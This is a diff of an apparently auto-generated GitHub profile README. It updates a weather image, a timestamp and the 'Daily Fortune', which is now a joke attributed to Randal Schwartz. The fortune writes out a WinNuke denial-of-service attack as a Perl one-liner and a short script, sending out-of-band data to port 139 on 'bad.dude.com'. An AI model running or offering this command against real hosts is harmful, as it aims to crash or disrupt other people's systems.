@@ -24,12 +24,21 @@
 #### Daily Fortune :crescent_moon:
 
 ```
-Bond reflected that good Americans were fine people and that most of them
-seemed to come from Texas.
-		-- Ian Fleming, "Casino Royale"
+Winnuke in one line?  No problem:
+perl -MIO::Socket -e 'IO::Socket::INET->new(PeerAddr=>"bad.dude.com:139")->send("bye",MSG_OOB)'
+
+And formatted so it's a little easier to read:
+
+        #!/usr/bin/perl
+        use IO::Socket;
+        IO::Socket::INET
+                ->new(PeerAddr=>"bad.dude.com:139")
+                ->send("bye", MSG_OOB);
+
+		-- Randal Schwartz
 ```
 
 #### Weather Report :partly_sunny:
 ![Weather for Rogers, AR](https://wttr.in/Rogers,%20AR_nFqp_background=0d1117.png?u)
 
-<sub>README.md generated at 2022-06-08 00:01:28.345787704 +0000 UTC :trollface:</sub>
+<sub>README.md generated at 2022-06-09 00:02:05.550727741 +0000 UTC :trollface:</sub>
